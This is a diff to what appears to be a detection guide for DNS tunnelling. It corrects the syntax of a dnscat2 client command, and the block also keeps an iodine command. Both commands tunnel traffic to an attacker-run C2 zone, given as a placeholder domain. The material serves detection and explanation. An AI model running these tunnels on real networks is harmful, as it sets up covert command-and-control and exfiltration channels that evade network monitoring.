@@ -20,6 +20,8 @@ long, high-entropy labels and a burst of unique names under one parent zone.
 ```sh
 # iodine: IP-over-DNS to the delegated zone (attacker runs the authoritative NS)
 iodine -f -P <shared-secret> <c2-domain>
-# dnscat2 client -> attacker's dnscat2 server on the delegated zone
-dnscat2-client --dns server=<c2-domain>,port=53 --secret=<key>
+# dnscat2 client -> attacker's dnscat2 server on the same delegated zone. The binary is
+# `dnscat` (dnscat2-client is only the package name); the bare domain is the zone, and in
+# `--dns`, `server=` would be the upstream RESOLVER, not the C2 zone.
+dnscat --secret=<key> <c2-domain>
 ```
